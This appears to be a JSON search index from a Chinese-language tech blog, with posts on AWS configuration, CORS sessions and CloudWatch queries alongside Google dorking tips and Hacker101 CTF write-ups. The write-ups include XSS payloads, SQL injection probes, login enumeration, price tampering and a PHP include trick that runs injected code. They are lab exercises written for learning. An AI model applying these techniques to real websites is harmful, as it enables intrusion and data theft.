{"pages":[{"title":"Archives","text":"","link":"/archive/index.html"},{"title":"All Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"How to use mapping template with API Gateway in AWS","text":"[Update] 2017-11-08 原本文章的 mapping 方式再依些特別狀況會出錯，在文章最下面加入了最新的 mapping 方式 最近需要在 API Gateway 上面作 request 和 response 的參數調整這裡紀錄一下一些基本的使用語法官方網站也有提供使用方式還有一些例子或是可以直接到 Apache Velocity Template Language if else1234567{ #if ($variable == &quot;cool&quot;) &quot;variable&quot; : &quot;$variable&quot; #else if ($variable == &quot;hot&quot;) &quot;variable&quot; : &quot;$variable&quot; #end} 如果參數是 cool 的話，顯示出來是123{ \"variable\": \"cool\"} type以上一個 case 來說，把 variable 改成是 1123{ &quot;variable&quot;: &quot;$variable&quot;} 這樣顯示出來會是123{ \"variable\": \"1\"} 但是如果改成這種格式123{ &quot;variable&quot;: $variable}這樣顯示出來會是123{ \"variable\": 1} 這邊要注意的是，如果格式是以下這樣，然後參數是 “test”123{ &quot;variable&quot;: $variable}這樣顯示出來會是1234{ // 這會直接讓 API Gateway mapping template 直接爆炸 \"variable\": test} key如果把 $variable 設成 “test”，並用以下的 template123{ &quot;$variable&quot;: &quot;$variable&quot;}結果會是123{ \"test\": \"test\"} foreach and keySet資料如下123456789101112{ \"data\": { \"book\": [{ \"title\": \"cool\", \"serial\": 123 }, { \"title\": \"hot\", \"serial\": 321 }] }, \"comment\": \"Hi\"} 我想要把他轉換成以下的格式，該怎麼用 mapping template12345678910{ \"book_library\": [{ \"name\": \"cool\", \"number\": 123 }, { \"name\": \"hot\", \"number\": 321 }], \"message\": \"Hi\"} mapping template 可以這樣寫12345678910111213141516171819202122232425262728293031323334353637#set($root = $input.path(\"$\")){ // keySet 可以拿到這層所有的 key // 這裡可以拿到 data 和 comment ($rootKey) #foreach($rootKey in $root.keySet()) #if($rootKey == \"data\") \"book_library\": [ #foreach($elem in $root.get($rootKey)) { // 這層可以達到 title 和 serial #foreach($i in $elem.keySet()) #if($i == \"title\") \"name\": \"$elem.get($i)\" #elseif($i == \"serial\") // 因為要讓這裡是數字，所以不加上雙引號 \"number\": $elem.get($i) #end #if($foreach.hasNext),#end #end } #if($foreach.hasNext),#end #end ] #elseif ($rootKey == \"comment\") \"message\": \"$root.get($rootKey)\" #end // 這是為了讓 // { // \"test\": 123 // } // 最後面的 123 加逗點用的 // 如果是會後一個，就不會加逗點了 #if($foreach.hasNext),#end #end} 更好的寫法在 aws 官網中，除了拿到 raw payload 之外還可以利用 $input.json() 的寫法拿到格式更完整的資料因為在原本的方式中，如果拿到的字串包含 \\n，這會讓 API Gateway 爆炸雖然可以透過 $util.escapeJavaScript 的方式避免但在每一個地方都加上 $util.escapeJavaScript 也是很蠢所以新的寫法會像是這樣 第一個地方是 #set($count = $foreach.count - 1) 這是為了拿到 index 第二個地方寫法就比較特別，拿到 index 之後，$input.json($) 這樣是拿到整個 payload (JSON)如果 $rootKey = 'book_library' 那這樣寫$input.json(&quot;$['$rootKey']&quot;) 等於 $input.json(&quot;$['book_library']&quot;) 的寫法，就可以拿到陣列了。那如果要拿第一個的話$input.json(&quot;$['$rootKey'][0]&quot;) 這樣就能拿到, 如果用變數取代的話，可以寫成$input.json(&quot;$['$rootKey'][$count]&quot;)拿到陣列後，要拿陣列裡面的物件就可以這樣寫$input.json(&quot;$['$rootKey'][0]['$i']&quot;) 等同於 $input.json(&quot;$['$rootKey'][0]['title']&quot;) 第三個就是讓剩餘的都直接拿出來就結束了 要特別注意的點是，不用加上 “” 在 $input.json() 外面了因為用 $input.json() 拿的已經是完整格式了String 就是 String，不用像上面的方式還要加上 “” 去讓他變成字串Boolean Int 等等全部都是，也不用擔心 \\n 這個出現1234567891011121314151617181920212223242526272829303132333435363738394041424344#set($root = $input.path(\"$\")){ // keySet 可以拿到這層所有的 key // 這裡可以拿到 data 和 comment ($rootKey) #foreach($rootKey in $root.keySet()) #if($rootKey == \"data\") \"book_library\": [ #foreach($elem in $root.get($rootKey)) { // ============= Here ================= #set($count = $foreach.count - 1) // ============= Here ================= // 這層可以達到 title 和 serial #foreach($i in $elem.keySet()) // ============= Here ================= #if($i == \"title\") \"name\": $input.json(\"$['$rootkey'][$count]['$i']\") #elseif($i == \"serial\") \"number\": $input.json(\"$['$rootkey'][$count]['$i']\") #end // ============= Here ================= #if($foreach.hasNext),#end #end } #if($foreach.hasNext),#end #end ] #elseif ($rootKey == \"comment\") // =============== Here ============== \"message\": $input.json(\"$.$rootkey\") // =============== Here ============== #end // 這是為了讓 // { // \"test\": 123 // } // 最後面的 123 加逗點用的 // 如果是會後一個，就不會加逗點了 #if($foreach.hasNext),#end #end}","link":"/2017/10/24/api-gateway-mapping-template/"},{"title":"前後端分離下之使用 session","text":"這邊主要在介紹當前後端架構上完全分離 (連 domain 都分離) 狀況下要如何達到使用 session 的方法 知道 CORS 是什麼的人且想直接知道怎麼做可以直接跳到重點筆記 前言以往我們前後端程式是寫在一起時，都是透過後端程式去 render (渲染) 一個頁面而在前端頁面做請求的時候，請求都會帶著 cookie 到 server 上去判別是否屬於為同一個人但當我們在前後端完全分離的狀況下，該怎麼去達到這件事情呢? CORS瀏覽器有一個限制，當這個 request 請求起始的地方跟 endpoint 不一致得時候會造成所謂 CORS 的問題舉例來說，假設網站架設在 https://www.example.com 底下，但是你的 API Server 是在 https://www.example1.com 的話這樣網站 POST 到 API Server 的請求就會被阻擋 (這時 request 是從 html 頁面發起) 因為這個限制，API Server 往往要在 Header 上加上以下幾個東西去符合瀏覽器的規範 Access-Control-Allow-Headers Access-Control-Allow-Origin Access-Control-Allow-Methods 透過設置這三個 header 的參數，就可以讓前端合法的使用 API Server 了所以按照剛剛的邏輯去加上 Header 會這樣加Access-Control-Allow-Headers: *Access-Control-Allow-Origin: https://www.example.comAccess-Control-Allow-Methods: POST 然而在使用前後端分離的架構下，身份驗證以及授權就相對上就變得比較難一點雖然解法上還可以使用 JWT 去解決這個問題，但這篇文章主要會鎖定在用 sessino 的方式去解決 題外話，有一種方式也可以繞過 CORS，就是以 Proxy Server 的方式去實作以下用著名的 Vue cli 為圖解 XHR Credential當加上以上三個 CORS 的規範後會發現在發出 request 的時候，是不會帶入 cookie 去給 server 做驗證 這時候就可以透過 xhr 裡面的 credential 去設定當把這個欄位設定成 true 的時候，request 就會夾帶 cookie 到 server 去 詳細操作說明提到前後端完全分離的話，那我們就要準備兩個 server一台 server 專門是讀取靜態 html 的 server一台 server 專門是處理 API 的 server html server透過 Node.js 快速建立一個可以讀取靜態檔案的 server 1234const express = require('express');const app = express();app.use(express.static(\"./public\"));app.listen(8888); 而 public/index.html 的內容為 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; let ajax = new XMLHttpRequest(); ajax.open('POST', 'http://localhost:7777/test'); ajax.setRequestHeader('Content-Type', 'application/json'); ajax.onload = function() { if (ajax.status === 200) { alert('Received ' + ajax.responseText); } }; ajax.send(JSON.stringify({ data: \"hi from html\" })); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; api server另一台主要當作 api server主要就印出 session id 來觀看每一次的 request 是不是同一個人 const express = require('express'); const app = express(); const session = require('express-session') var sess = { secret: 'keyboard cat', cookie: {}, resave: true, saveUninitialized: false, } const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session(sess)) app.use((req, res, next) =&gt; { res.setHeader(\"Access-Control-Allow-Headers\", \"X-Requested-With, Accept, Content-Type, Cookie\") res.setHeader(\"Access-Control-Allow-Origin\", \"*\") res.setHeader(\"Access-Control-Allow-Methods\", \"GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH\") next(); }) app.post('/test', (req, res) =&gt; { console.log(req.sessionID); req.session.a = \"hi\" res.json({a: 1}) }) app.listen(7777, () =&gt; { console.log('start'); }); 實作透過執行以上的兩個 server 程式，寫後近到 http://localhost:8080 之後按下幾次重整，可以看到 api server 印出來的 session 每一次都是不同個 接下來就是要透過 xhr 的 credential 去設定在 ajax 送出之前要加上 ajax.withCredentials = true; 這樣才可以把 Cookie 夾帶上去但會發現瀏覽器卻爆出另一個錯誤訊息The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true' when the request's credentials mode is 'include'這是前後端必須要同步都使用 credentials 才可以用於是在後端 server 加上 Access-Control-Allow-Credentials: true 但再度重整之後又發現新的錯誤！The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. 其實這也是限制的一種，當使用到 credentials 的時候，後端必須多限制只有一個 domain 能使用 Access-Control-Allow-Origin: http://localhost:8888這樣設定之後按幾次重整就會發現 session id 是一致的了 重點筆記後端必須加上以下的 headers Access-Control-Allow-Headers: * Access-Control-Allow-Origin: http://localhost:8888 只能指定一個 domain，不能用 * 字號 Access-Control-Allow-Methods: * Access-Control-Allow-Credentials: true 1, 3 兩點根據需要使用的 method 和 headers 再去客製化以資安來說建議不寫上 *，寫上有使用的就可以了 前端則是必須在 xhr 上面加上 xhr.withCredentials = true 後記以上為簡單介紹如何在前後分離架構下依舊可以使用 session 的方式而文章有提到 JWT，那是另一種驗證及授權方式，有機會再來談談這個技術實作的方式","link":"/2019/06/02/ajax-with-session/"},{"title":"AWS Certificate Manager 如何更換憑證 (Reimport Certificate)","text":"前言AWS 有提供一套服務可以把申請好的憑證一次給多個服務使用掛載在上面的憑證可以給 load balanacer, cloudfront 等等使用 以 load balancer 來說外面 https:443 進來後，要導入到 http:8080 的服務就會需要把憑證解開，然後進一步把流量往裡面送所以在 load balancer 上面就一定要掛載 private/public key 才有辦法去解開進來的流量像是在選 load balancer 的頁面，選擇 port forwarding 的時候就會需要選擇要掛載哪一個 certificate 而在 cloudfront 的時候在申請的同時也會需要填入要用哪一組憑證 (Customer Certificate) 當選入憑證的時候，Cloudfront 配給你的 domain 是 xxxxx.cloudfront.net 這種但憑證假設安裝的事 api.example.com 這種，會導致不安全的提示出現此時會需要到網域註冊商，把 CNAME api 指到 xxxxx.cloudfront.net到時候瀏覽 api.exmaple.com 就會出現合法的憑證了 如何更新憑證首先要進入到 AWS 的 Certificate Manager 頁面，並且點選你想要 Reimport 的憑證右上角會有一個藍色的『Reimport Certificate』按鈕，點選下去會到一個輸入頁面 到了輸入頁面會看到有 Certificate Body, Certificate Private Key, Certificate Chain接下來就把跟網域註冊商申請到的憑證一個一個貼上去即可，注意這裡要是 PEM 格式 其實在新增憑證的時候，也是一模一樣的流程","link":"/2020/01/06/aws-certificate-manager/"},{"title":"如何增加 EC2 硬碟大小 (Expand the disk space in EC2)","text":"前言在使用 AWS 服務時，有時候會因為 log 量太大導致硬碟大小不夠此時會需要把硬碟增加大小，以免整台機器爆掉接下來會針對如何增加硬碟大小做說明 確認硬碟大小方法可以透過 df -h . 指令確認硬碟目前使用的大小這時候可以看到硬碟配置的大小 接下來可以透過 lsblk 回找最大上限的配置可以是多少上面 xvda 就是最多可以有多少大小下面 xvda1 就是實際上目前有多少大小 看另一個例子，以下圖的 xvdi 和 xvdi1 來說可配置最大上限為 8G，但目前正在使用的最大上限為 1023 MB 增加硬碟大小到 EC2 的頁面點選要更新的 EC2，點選右下角 disk 點進去之後，就進入到另一個頁面，點選 Action &gt; Modify，會看到以下頁面，就可以增加大小了 接下來要到 EC2 裡面把實際上使用的大小擴充到可配置的最大空間以剛剛的 xvdi 為例的話，需要執行以下兩個指令才可以擴充12sudo growpart /dev/xvdi 1sudo resize2fs /dev/xvdi1這樣大小會直接擴充至可配置的最大上限，如果不想要配置到最大的話可以在後面加上幾 G 去做限制，如下123# 擇一sudo resize2fs /dev/xvdi1 2Gsudo resize2fs /dev/xvdi1 2048M","link":"/2020/01/06/aws-increase-disk-space-in-ec2/"},{"title":"如何啟用 AWS EC2 IPv6 ?","text":"前言要讓 ec2 支援 ipv6 要先注意以下三點事項確認好這三點可以先 Marked 一下待會要額外做哪一些設定 確認 ec2 instance type 是否支援 ipv6, 可參考 Instance Types 確認 ec2 instance 是在 public subnet 還是 private subnet public subnet → 要用到 internet network gateway private subnet → 要用到 egress-only network gateway 確認 ec2 建立的方式, 以下有兩點要注意 2016.09 後 Linux 不需要多作設定 如果機器是用 AMI 建立的話, 需要手動設定 ipv6 的設定才能啟用 ipv6 其他版本 OS 使用方法可以參考 Configure IPv6 on Your Instances 啟用 ipv6啟用 ipv6 有以下幾個步驟要走 VPC 需要啟用 ipv6, 按下 Add IPv6 CIDR 讓它自動產生一組 Subnet 需要設定 ipv6 CIDR, 這邊注意到圖中的 00 是可以從 00 01 02 這樣慢慢設定上去, 另外這個 00 是以 16 進位表示 設定 Route Table 對外的部分 Desitination: ::/0 以下二擇一, 根據 ec2 所在的環境判斷 (Private Subnet) Target: egress-only network gateway (Public Subnet) Target: Internet network gateway 設定 ec2 的 Security Group, Outbound 的部分要設定 Desitination: ::/0 Type: All Traffic Protocol: All Port range: All 指派 ipv6 給 ec2, 按下 Assign New IP 之後留空, 再按下 Yes, Update 讓它自己指派 接下來最後一點, 就要看機器狀況, 如同一開始提到的兩個情況 2016.09 後 Linux 不需要多作設定 如果機器是用 AMI 建立的話, 需要手動設定 ipv6 的設定才能啟用 ipv6 其他版本 OS 使用方法可以參考 Configure IPv6 on Your Instances 這邊就介紹用 Ubuntu 14 版本啟用的方式 Ubuntu 14 版本啟用 ip v6 的方式 修改 /etc/network/interfaces.d/eth0.cfg 內容 請在 iface 的下面一段加上 up dhclient -6 $IFACE 12345678# 原本auto eth0iface eth0 inet dhcp# 修改後auto eth0iface eth0 inet dhcp up dhclient -6 $IFACE 接著 sudo reboot 輸入 ifconfig 確認 ipv6 是否正確, 如果不正確, 輸入 sudo dhclient -6 啟用 ipv6 其他版本 OS 使用方法可以參考 Configure IPv6 on Your Instances References Migrating to IPv6","link":"/2020/03/30/ec2-ipv6/"},{"title":"使用 Apple Pay 時 Safari 如何開啟開發者模式去 Debug 呢?","text":"有時候在使用類似 Apple Pay 的東西並不知道該如何去看手機中 Safari 的偵錯\b然後就會愣在那裡，並不知道該怎麼 Debug今天要跟各位來介紹如何在 iPhone 上面開啟 Safari 的開發者模式 前提首先要確認 iPhone 手機上面的 Safari &gt; 進階 &gt; 網頁檢閱器 是否有打開才可以喔！沒有打開的話是不能使用 Develop Debug mode 整體流程 把你的 iPhone 線接到 Mac 上 在手機上面開起 Safari，然後打開一個頁面 開啟 Mac 上的 Safari 左上選單選擇 『開發者』(Develop) 下面會有你手機的名稱，點下去就會看到手機 Safari 頁面 接下來會跳出 Safari 的開發者模式，就可以繼續 Debug 拉 ~","link":"/2018/04/21/apple-debug/"},{"title":"CloudFront 設定 Header Forward","text":"最近在使用 CloudFront Header forward 的設定CloudFront 預設會把 User-Agent 這個 header 替換成 Amazon CloudFront於是開始研究起要怎麼把原始的 User Agent 完整的帶到 Origin 去 但由於 CF 上面的設定寫的不是很清楚於是發現以下這篇 AWS 官方文章這裡直接做一個總結 None: 使用 CloudFront 原生的行為 (例如替換 User-Agent) Whitelists: 把 whitelists 裡面的參數，完整不動 的 Forward 到 Orign 去使用 ALL: 把所有參數都 forward 到 Origin 去 下面是一個 whitelist 的簡單範例 以這張圖的設定的來說，代表 User-Agent 不會被 CloudFront 給自動替換掉而是會拿原生User-Agent直接 forward 到 Origin 去 另外這邊要提醒，Cloudfront 預設是不會 Forward Headers, Cookies 和 Query String 的這邊要特別注意，要特別設定才可以那至於 Cookie 以及 Query String 的設定看上面就明瞭了","link":"/2018/09/05/cloudfont-setting/"},{"title":"如何從多層 Load Balancer / Nginx 取得使用者正確的 IP?","text":"前言我們有時候要取得使用者 IP往往都會用最簡單的方式取得 IP以 express 為例子，會使用 req.connection.remoteAddress req.ip 等等方式取得 IP但你知道，當伺服器被多層的 Load Balancer 保護在前面的時候取得到的 IP 會是 Load Balancer 的嗎?而真正的 IP 會被 Load Balancer 放在 X-Forwarded-For 上面，傳遞到後面伺服器如果不知道的話，那這邊文章有可能會幫助到你 接下來會以 AWS 的 Load Balancer 以及伺服器上建立一個 Nginx 服務然後還有一個 express server 服務來說明從無 Load Balancer 到雙層 Load Balancer 的架構下分別該如何取得 IP Direct Connection架構示意圖如下 當我們連線時直接連到伺服器時可以透過 express 的 req.connection.remoteAddress 取得到使用者的 IP (233.x.x.x)原因是此時的呼叫者是使用者 單層 Load Balancer架構示意圖如下 當我們遇到只有一層 Load Balancer 時透過 express 的 req.connection.remoteAddress 會取得到的是 Load Balancer 的 IP (10.x.x.x, 圖中最下面)原因是 Load Balancer 作為中介者，取得到了 Rqeuest 之後會再往後端伺服器轉發，這時候呼叫者就是 Load Balancer 而不會是使用者使用者真正的 IP 是會放在 header 的 X-Forwarded-For 上面 (233.x.x.x) 這邊 Load Balancer 可以是 Nginx，但這邊我們用 AWS Load Balancer 做 DEMO原因是我們後面會需要架構出兩層 Load Balancer 的狀況 雙層 Load Balancer架構示意圖如下 而當我們再加上一層 Load Balancer 的時候 (這裡用 nginx 代替)透過 express 的 req.connection.remoteAddress 會取得到的是 Nginx 的 IP因為呼叫者從上一個案例的 Load Balancer 變成了 Nginx而我們這邊 Nginx 是架設在 localhost 裡面，所以可以看到 IP 是 127.0.0.1 (圖中最下面)那前面 Load balancer 的 IP 就被放到 X-Forwarded-For 上面去了 (10.x.x.x 那個) 雙層 Load Balancer + 惡意 X-Forwarded-For架構示意圖如下 狀況如同前面的 Case，但這邊唯一不一樣的是萬一使用者自己在 X-Forwarded-For 加了 X-Forwarded-For: 5.5.5.5, 6.6.6.6這些資料是會被放到 X-Forwarded-For 最前面去的所以在取得 IP 的時候要特別注意並不是取得 X-Forwarded-For 的第一個就可以了應該要根據你前面放了多少個 Load Balancer 去決定要拿從後面數過來的第幾個才是正確的 References其他還有很多詳細的介紹，非常推薦看以下這篇文章，大推！ https://devco.re/blog/2014/06/19/client-ip-detection/","link":"/2020/01/09/express-get-client-ip-from-load-balancer/"},{"title":"Google Hacking","text":"這次要跟大家介紹一下 Google 到底有多好用相信用過 Google 都知道，Google 的搜尋很方便但是你知道，Google 還有提供除了關鍵字搜尋以外的各種神奇的搜尋方式嗎 ? 下面這張表就是 Google 提供的各種搜尋技巧先用幾個來讓大家了解如何使用這個方便的技巧吧！ site:假設我想要搜尋我這個網站的，光靠關鍵字搜尋是很難搜尋到的排名不高，曝光度也不高更是難上加難但是可以透過以下的方式搜尋到1site:yu-jack.github.io intitle:intitle 就是搜尋 title 呈現的文字我們可以搜尋一個有趣的東西 “Index Of” 1intitle:&quot;Index Of&quot; 可以發現搜尋到一些看起來很像目錄的東西這個代表這個網站的開發者，沒有適當的處理這個問題這樣會導致網站的所有目錄曝光在公眾之下裡面是什麼，我就不點了，有興趣可以試試看 inurl:inurl 就是搜尋 url 之中有沒有包含這個字串我用以下方式搜尋的話1inurl:login就會發現一堆 url 包含 login 的網址出現 filetypefiletype 會去搜尋副檔名，但是他不能單獨使用必須跟其他指令混在一起使用 1inurl:ntust filetype:pdf 結論這邊做了一點簡單的介紹而已，並沒有作太多詳細介紹但是可以參考以下的 PDF 去觀看更多不同的技巧Google Hacking for PenetrationTesters 下面這個是公開搜尋 keyword，也許可以直接搜尋到別人不想讓你看到的東西Google Hacking Database 介紹就到這邊，以後有空會再回來把這篇補詳細","link":"/2017/10/17/google-hacking/"},{"title":"Hacker 101 CTF Write Up Part 2 - Micro-CMS v1, Petshop Pro","text":"系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ Micro-CMS v1根據題目總共有 4 個 Flag 0x00打開頁面後頁面是 試著建立 post 試試看 發現有 XSS 跳出來，但打開原始碼沒發現什麼變化 按了 Go Home 會去上一頁就跳出 FLAG 了 0x01因為跳出 xss 的時候注意到 page 後面的 id 帶的是 8覺得很疑惑，因為總共才三筆資料，id 怎麼會是 8? 於是就 8 7 6 回去一個一個看看是不是有什麼玄機發現 id 是 6 的時候，出現了 forbidden 的字樣，寫著不可讀 竟然不可讀的話，試著加上 edit 發現可以編輯，且內容有 FLAG 0x02接下來就試著對每一個頁面的 id 做 SQL Injection發現在 edit 的頁面狀況下，id 會有 SQL Injection於是就跳出 FLAG 了 0x03這個漏洞我找非常非常的久才發現原來的 &lt;svg/onload=alert('xss') payload 是跳不出 FLAG 的要用 &lt;img src=&quot;&quot; onerror=&quot;javascript:alert('xss')&quot;/&gt; 才跳得出來 打開原始碼發現 FLAG 就藏在下面第一張是 img tag 的原始碼第二張是 svg tag 的原始碼兩個都可以觸發 xss，但只有 img 有 FLAG不知道為何 svg 那一個 payload 不能觸發可能是這題的解答，有希望某一些固定的 tag 去寫才會造成 svg payload 跳不出 FLAG Petshop Pro根據題目總共有 3 個 Flag 0x00進去之後頁面長這樣 按下 Add to Cart 之後 在按下 checkout 看來是一個結帳流程，講到錢就想來試試看能不能 0 元結帳看了一下 source code 發現有一個 hidden input 並且用 javascript 把價格更改成 0 元後送出 送出後價格為 0 元且拿到 FLAG 0x01透過 nmap 找到登入點為 /login 之後 稍微試著輸入單引號看看會不會有 SQL Injection 問題，結果沒有 QQ但因為輸入 username 的時候，輸入錯誤會爆出 Invalid username代表說此系統設計方式，如果輸入正確的 username 的話，應該不會爆出這個錯誤根據以上邏輯先寫出第一版程式找找看 username 找到 username 後輸入，的確變成 Invalid password那就繼續找密碼 接下來用一樣的方式找到密碼 登入成功，出現 FLAG! 0x02登入後發現可以編輯商品 試著輸入 xss payload，跳出 xss，但打開原始碼沒發現任何東西 試著加入購物車發現，也會跳出 xss 打開原始碼發現 FLAG!","link":"/2019/09/06/hacker101-part2/"},{"title":"Hacker 101 CTF Write Up Part 3 - Ticketastic Live Instance","text":"系列篇第三篇，目前題目寫下來都蠻有趣的 Ticketastic: Live Instance根據題目總共有 2 個 Flag 0x00一進來發現有兩個同樣名稱的題目，這邊先點上面的 DEMO 進去看看 大概就是介紹，但最後發現一句特別的話『會有機器人來讀這些 ticket』不太明白這意思，先放著一邊繼續看看有什麼功能，裡面提到用 admin/admin 可以先登入 登入後可以看到有一個 ticket 以及可以新建使用者 點了 ticket 進去看了一下，提到說，如果處理錯誤的話會在這邊被標記起來看起來是使用者提供錯誤的連結的話，當機器人處理不了時會在這邊顯示提醒但這邊看起來沒什麼洞可以挖，繼續往下 嘗試去建立使用者，發現可以建立成功 另外還發現建立方式是用 GET 去建立這就有點微妙了，一般來說，像是使用 LINE 等等通訊軟體貼連結上去，都會預設去做 GET，然後把預覽顯示出來這邊也有可能走這種方式 這邊建立一個 ticket 嘗試看能不能用 GET 連結的方式去建立使用者但卻發現連結處理錯誤!? 試著換另一個連結，依舊錯誤 想了非常久才想到，這應該是 SSRF 的一種利用於是把 payload 改成 localhost 的方式去探測能不能用內網方式新增使用者發現不再顯示錯誤連結！ 建立的使用者也能正確地登入！ 接著就把這個 Payload 帶到另一個題目，發現能夠登入！登入後發現第一個 FLAG 0x01接下來發現連結上面有 id試著帶入單引號發現噴出 SQL Exception 丟入 sqlmap dump 出 admin 的密碼就是 FLAG 了","link":"/2019/09/08/hacker101-part3/"},{"title":"AWS CloudWatch Logs Insights 介紹及教學","text":"前言AWS CloudWatch 是一個可以監控日誌用以及伺服器狀態等等的服務其他還有像是 Alarm Events 都是從以下兩個大項目延伸出去的額外功能這邊就先不多作介紹，之後會寫在其他篇幅做介紹那 CloudWatch 主要包含以下兩個大項目 Metric 紀錄了 AWS 上面服務的狀態 包含 EC2 的 CPU、網路使用量、記憶體用量和硬碟大小 API Gateway API Call Count、RDS CPU 用量等等 針對用量還可以去做 Alarm 發信，或是觸發 Lambda 等等的功能 記憶體和硬碟大小需要額外設定可以參考 https://docs.aws.amazon.com/zh_tw/AWSEC2/latest/UserGuide/mon-scripts.html Log 存放 Log 的地方，伺服器的 access log 或是程式的 log 又或是 audit log 等等，基本上想看的 log 可以推上來做分析以及整理 除此之外，s3 其實也是一個放 log 的好地方 但 s3 的缺點是不能夠很便利的去線上觀看 log 今天主要介紹的是 CloudWatch Logs Insights 功能透過 Insights 可以有效地查詢 Log 裡面的資料甚至還可以做統計以及剖析 Log 裡面的字串進行字串統計 使用方式範例一 - like123fields @timestamp, @message| sort @timestamp desc| filter @message like &quot;Your Wanted Message&quot; 第一行 fileds 主要指定最後出現的欄位會有什麼第二行 sort 是根據 timestamp 進行由大至小的排序第三行 filter 是針對 @message 的內容去搜尋 最後只會顯示跟 like 後面有關的字串的結果而已 這邊要另外注意的事情是，每一個指令都是有順序性的以上面第三行的結果來說假設第四行再下了一個 filter @message like &quot;blablabla一個跟前面完全沒有關係的訊息是找不到的因為在第三行就把所有訊息都過慮剩下只有 “Your Wanted Message”所以在第四行針對 “Your Wanted Message” 去搜尋 “blablabla” 當然就不會出現任何結果 範例二 - @logStream在整個操作 UI 上最上面會有一個可以選 logGroup 的地方但卻沒有選 logStream 的地方 此時會需要透過 filter 加上 @logStream 的方式才能找單獨的 stream12fields @timestamp, @message| filter @logStream = &quot;Access Logs&quot; 範例三 - parse假設今天要處理 access log 的 path 做統計的話字串有一段內容是 “GET /login HTTP/1.1”我想要 parse 出 /login 的話該怎麼做呢？123fields @timestamp, @message| sort @timestamp desc| parse '&quot;GET * HTTP/1.1' as @path第三行 透過 parse 指令加上 * 可以把 * 的地方變成一個變數指定到 as 後面的變數去這裡變數要不要加 @ 都可以，結果如下： 那如果想要 parse 兩個變成變數呢?很簡單，就是再多加一個 * 字號在後面即可| parse '&quot;GET * */1.1' as @path, @protocol 範例四 - stats count()以前面的例子來說我想知道在短時間內有幾個 login 的話可以透過 stats 的指令去做統計12345fields @timestamp, @message| filter @logStream = &quot;Access Logs&quot;| sort @timestamp desc| parse '&quot;GET * */1.1' as @path, @protocol| stats count(*) as sum by @path第五行 透過 by 指令去 group by 用哪一個參數當作目標去做計算 當然一樣可以多個 | stats count(*) as sum by @path, @protocol 後記以上介紹一些個人比較常用的指令，官網還有很多非常好用的指令詳細有興趣可以到官網上查查看https://docs.aws.amazon.com/zh_tw/AmazonCloudWatch/latest/logs/CWL_QuerySyntax.html","link":"/2019/11/28/aws-cloudwatch-logs-insights/"},{"title":"Hacker 101 CTF Write Up Part 5 - Cody's First Blog","text":"Cody’s First Blog這題總共有 3 個 flag 0x00一開始畫面長這樣 裡面有提到好像是用 php 建立的試著提交看看 &lt;?php echo phpinfo(); ?&gt;就得到第一個 FLAG 了，但好像沒有像想像中一樣可以直接 phpinfo 0x01接下來看一下 source code 發現一個特別的地方 被註解掉的 admin path Path: http://34.74.105.127/8a10550a14/?page=admin.auth.inc發現看到可以登入的地方 嘗試輸入 username 看會不會有列舉的漏洞以及輸入一些弱密碼嘗試登入全部都不行，暫時就先擱置不看 這邊就開始有點卡住了 …回去首頁看看有什麼特別的東西有一句話有提到有用到 include 這個 function而剛剛的參數中 ?page=admin.auth.inc 是登入用的 php接下來這邊試著改成 ?page=admin.inc 發現就 bypass 登入的機制到 admin 頁面了然後就發現 FLAG 以及可以 approve 剛剛 submit 的 comment 0x02按下 approve，是一個 GET Url嘗試對 approve 做 SQL Injection 檢測發現沒有問題 接下來回到首頁，檢視原始碼發現一個特別的東西一開始輸入的參數被 approve 後顯示在這裡有點特別，但因為不能執行所以沒什麼用就先擱著不動 接下來嘗試對 page 參數亂打 看來的確是用 include 去引入別的檔案而且還會再參數後面再加入 .php 的副檔名 這邊嘗試用 php://filter 看能不能讀取原始碼結果發現不能 QQ 看到 include 後回想起首頁提到的這個 server 不能對外連線，也只有作者可以上傳檔案以及他都是用 include 去引用檔案 這裡聯想到一件事情include 是不是也能用 http:// 去把檔案引入並執行呢?於是這邊嘗試引用 http://34.74.105.127/8a10550a14/?page=http://localhost/admin.inc發現可以引用成功，但還是沒有提供什麼資訊 但因為用 include 配合 http:// 會有一個特色假如 test2.php 內容為12&lt;?php $body = \"&lt;?php echo phpinfo(); ?&gt;\" ?&gt;&lt;p&gt;&lt;?php echo $body ?&gt;&lt;/p&gt; test3.php 內容為1&lt;?php include(\"test2.php\") ?&gt; 直接讀取 test2.php 的時候，是沒辦法執行 phpinfo()只會出現這樣的結果 讀取 test3.php 時這邊會出現跟直接讀取 test2.php 一樣的結果 但如果把 test3.php 改成用 http:// 協議會怎麼樣呢?1&lt;?php include(\"http://localhost:7888/test2.php\") ?&gt;它會把 test2.php 顯示的結果，當成原始碼繼續使用下去結果就會變成可以成功執行 phpinfo 了 那因為剛剛一開始頁面也有一樣的邏輯出現首頁也有顯示 &lt;?php echo phpinfo(); ?&gt; 那如果說有辦法，讓這個頁面在被 include 一次的話就可以成功執行 phpinfo() 了所以 payload 會改成以下http://34.74.105.127/8a10550a14/?page=http://localhost/index然後就成功可以執行了 重新輸入一個參數 &lt;?php readfile(&quot;index.php&quot;) ?&gt; 並且 approve回到首頁檢視原始碼發現 FLAG !","link":"/2019/09/14/hacker101-part5/"},{"title":"Hacker 101 CTF Write Up Part 4 - Photo Gallery","text":"Photo Gallery 0x00一開始畫面長這樣 發現原始碼有一個 fetch?id=1 點進去網址發現回傳一個 jpg 的 text 檔案 從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的加個 ‘ 發現好像沒有 SQL Injection 的存在，但卻出現 500 Internal Server Error可能程式有哪邊出錯了，繼續往下測試 不過當改下 fetch?id=1 union all select 1 以及 fetch?id=1 union all select 1,2 發生一點不同變化前者出現跟 fetch?id=1 結果一模一樣 (上圖)後者卻出現 500 Internal Server Error (下圖) 看來就是有 SQL Injection 